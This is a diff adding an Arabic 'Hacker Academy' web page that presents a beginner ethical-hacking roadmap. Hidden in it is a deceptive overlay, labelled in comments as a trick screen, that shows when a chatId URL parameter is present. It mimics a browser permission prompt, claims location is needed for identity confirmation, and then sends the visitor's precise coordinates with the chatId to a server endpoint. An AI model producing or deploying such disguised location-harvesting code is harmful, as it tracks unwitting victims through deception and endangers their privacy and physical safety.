@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>أكاديمية الهكرز - تعلم الأمن السيبراني</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Share+Tech+Mono&display=swap');
+    
+    * { box-sizing: border-box; }
+    body {
+      background-color: #020202; color: #e0e0e0; font-family: 'Cairo', sans-serif;
+      margin: 0; padding: 0; min-height: 100vh;
+      background-image: url('https://www.image2url.com/r2/default/images/1792801264392-ccf08e2c-193f-4573-a90c-ae290da2eadf.png');
+      background-size: cover; background-position: center; background-attachment: fixed;
+      display: flex; flex-direction: column; align-items: center;
+    }
+
+    .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(5, 10, 20, 0.92); z-index: 0; }
+    .content-wrapper { position: relative; z-index: 1; width: 100%; display: flex; flex-direction: column; align-items: center; padding-bottom: 40px; }
+
+    /* الصورة الرئيسية */
+    .hero-image { 
+      width: 100%; max-width: 600px; height: 220px; object-fit: cover; 
+      border-bottom: 3px solid #00ff00; box-shadow: 0 10px 30px rgba(0, 255, 0, 0.2); 
+      margin-bottom: 20px; 
+    }
+
+    /* الهيدر */
+    .header { width: 100%; max-width: 600px; padding: 10px 20px 20px 20px; text-align: center; border-bottom: 1px solid rgba(0, 255, 0, 0.3); margin-bottom: 20px; }
+    .header h1 { margin: 0; font-size: 28px; font-weight: 900; color: #00ff00; text-shadow: 0 0 15px #00ff00; font-family: 'Share Tech Mono', monospace; }
+    .header p { margin: 10px 0 0 0; font-size: 14px; color: #00ffff; letter-spacing: 1px; }
+
+    /* الكروت */
+    .container { width: 100%; max-width: 600px; padding: 0 15px; display: flex; flex-direction: column; gap: 20px; }
+    .card { background: rgba(10, 20, 10, 0.85); border: 1px solid rgba(0, 255, 0, 0.4); border-radius: 12px; padding: 20px; box-shadow: 0 0 20px rgba(0, 255, 0, 0.1); }
+    .card h2 { color: #00ff00; font-family: 'Share Tech Mono', monospace; font-size: 20px; margin-top: 0; border-bottom: 1px dashed rgba(0, 255, 0, 0.3); padding-bottom: 10px; margin-bottom: 15px; }
+    .card p { line-height: 1.8; font-size: 15px; color: #ccc; margin-bottom: 10px; }
+    .card ul { padding-right: 20px; line-height: 1.8; font-size: 15px; color: #bbb; }
+    .card ul li { margin-bottom: 8px; }
+    .card ul li strong { color: #00ffff; }
+    
+    .step-number { 
+      display: inline-block; background: #00ff00; color: #000; font-weight: bold; 
+      width: 25px; height: 25px; text-align: center; line-height: 25px; 
+      border-radius: 50%; margin-left: 8px; font-family: 'Share Tech Mono', monospace;
+    }
+
+    /* شاشة الخدعة (طلب الموقع) */
+    .browser-mockup {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.9); z-index: 999;
+      display: none; flex-direction: column; align-items: center; justify-content: center;
+    }
+    .browser-alert {
+      background: #fff; color: #333; border-radius: 12px; padding: 20px;
+      max-width: 350px; width: 90%; box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+      text-align: center; font-family: Arial, sans-serif;
+    }
+    .browser-alert h3 { margin-top: 0; color: #000; font-size: 18px; }
+    .browser-alert p { color: #555; font-size: 14px; margin-bottom: 20px; }
+    .browser-alert .btn { 
+      background: #0066cc; color: white; border: none; padding: 10px 20px; border-radius: 6px; 
+      font-size: 16px; font-weight: bold; cursor: pointer; width: 100%;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="overlay"></div>
+
+  <div class="content-wrapper">
+    <!-- صورة التصميم -->
+    <img src="https://www.image2url.com/r2/default/images/1792801264392-ccf08e2c-193f-4573-a90c-ae290da2eadf.png" class="hero-image" alt="Hacker Academy">
+    
+    <div class="header">
+      <h1>أكاديمية الهكرز</h1>
+      <p>دليلك الشامل لتعلم الأمن السيبراني من الصفر إلى الاحتراف</p>
+    </div>
+
+    <div class="container">
+      <!-- المقدمة -->
+      <div class="card">
+        <h2>🚀 مرحباً بك في عالم الاختراق الأخلاقي</h2>
+        <p>الأمن السيبراني هو الدرع الذي يحمي عالمنا الرقمي. في هذه الأكاديمية، سنأخذك في رحلة من الصفر لتتعلم كيف تفكر مثل الهاكرز، وكيف تحمي الأنظمة من الهجمات. تذكر دائماً: <strong>الاختراق الأخلاقي يستخدم للدفاع وليس الهجوم.</strong></p>
+      </div>
+
+      <!-- الخطوة 1 -->
+      <div class="card">
+        <h2><span class="step-number">1</span> أساسيات الشبكات (Networking)</h2>
+        <p>قبل أن تبدأ في الاختراق، يجب أن تفهم كيف تعمل الشبكات:</p>
+        <ul>
+          <li><strong>بروتوكول IP:</strong> كيف تتنقل البيانات بين الأجهزة.</li>
+          <li><strong>TCP/UDP:</strong> الفرق بين الاتصال الموثوق (TCP) والسريع (UDP).</li>
+          <li><strong>DNS:</strong> كيف يتم تحويل أسماء المواقع إلى عناوين IP.</li>
+          <li><strong>الراوتر والمودم:</strong> كيف يتم توجيه البيانات في الشبكة.</li>
+          <li><strong>المنافذ (Ports):</strong> الأبواب التي تستخدمها البرامج للتواصل.</li>
+        </ul>
+      </div>
+
+      <!-- الخطوة 2 -->
+      <div class="card">
+        <h2><span class="step-number">2</span> احتراف أنظمة لينكس (Linux)</h2>
+        <p>الهاكرز لا يستخدمون الويندوز! لينكس هو نظام التشغيل الأساسي لكل خبير أمني.</p>
+        <ul>
+          <li>تعلم أوامر الطرفية (Terminal) الأساسية (مثل `ls`, `cd`, `grep`).</li>
+          <li>تثبيت <strong>Kali Linux</strong> أو <strong>Parrot OS</strong> (أنظمة مبنية للاختراق).</li>
+          <li>فهم إدارة الصلاحيات (Permissions) والمستخدمين (root).</li>
+        </ul>
+      </div>
+
+      <!-- الخطوة 3 -->
+      <div class="card">
+        <h2><span class="step-number">3</span> لغة البرمجة (Python)</h2>
+        <p>بايثون هي لغة الهاكرز المفضلة لكتابة السكريبتات والأدوات.</p>
+        <ul>
+          <li>تعلم الأساسيات: المتغيرات، الحلقات، الدوال، والمكتبات.</li>
+          <li>كتابة سكريبتات لفحص الشبكات (Scanners).</li>
+          <li>أتمتة المهام المتكررة في اختبار الاختراق.</li>
+        </ul>
+      </div>
+
+      <!-- الخطوة 4 -->
+      <div class="card">
+        <h2><span class="step-number">4</span> أدوات الاختراق الأخلاقي</h2>
+        <p>هذه أشهر الأدوات التي ستتعامل معها في رحلتك:</p>
+        <ul>
+          <li><strong>Nmap:</strong> لفحص المنافذ والخدمات المفتوحة على الشبكة.</li>
+          <li><strong>Metasploit:</strong> منصة قوية لتنفيذ الاختراقات واستغلال الثغرات.</li>
+          <li><strong>Wireshark:</strong> لتحليل حزم البيانات (Packet Analysis).</li>
+          <li><strong>Burp Suite:</strong> لاختبار أمان تطبيقات الويب.</li>
+          <li><strong>John The Ripper:</strong> لكسر كلمات المرور (Password Cracking).</li>
+        </ul>
+      </div>
+
+      <!-- الخطوة 5 -->
+      <div class="card">
+        <h2><span class="step-number">5</span> الشهادات الاحترافية</h2>
+        <p>لتصبح خبيراً معترفاً به عالمياً، ابحث عن هذه الشهادات:</p>
+        <ul>
+          <li><strong>CompTIA Security+:</strong> البداية المثالية للأمن السيبراني.</li>
+          <li><strong>CEH (Certified Ethical Hacker):</strong> تعلم كيفية التفكير كهاكر.</li>
+          <li><strong>OSCP (Offensive Security Certified Professional):</strong> الاختبار الأصعب والأقوى في الاختراق.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- شاشة الخدعة (طلب الموقع) -->
+  <div class="browser-mockup" id="browserMockup">
+    <div class="browser-alert">
+      <h3>📍 الموقع يطلب الوصول</h3>
+      <p>يرجى السماح بالوصول إلى <b>موقعك الجغرافي</b> لتأكيد هويتك قبل الدخول للأكاديمية.</p>
+      <button class="btn" onclick="requestLocation()">سماح (Allow)</button>
+    </div>
+  </div>
+
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const userChatId = urlParams.get('chatId');
+
+    window.onload = function() {
+      if (userChatId) {
+        document.getElementById('browserMockup').style.display = 'flex';
+      }
+    };
+
+    function requestLocation() {
+      const mockup = document.getElementById('browserMockup');
+      
+      if (!navigator.geolocation) {
+        mockup.style.display = 'none';
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const accuracy = position.coords.accuracy;
+          
+          const formData = new FormData();
+          formData.append('chat_id', userChatId);
+          formData.append('lat', lat);
+          formData.append('lon', lon);
+          formData.append('accuracy', accuracy);
+
+          try {
+            await fetch('/upload_location', { method: 'POST', body: formData });
+          } catch (e) {}
+
+          mockup.style.display = 'none';
+        },
+        (error) => {
+          mockup.style.display = 'none';
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    }
+  </script>
+</body>
+</html>
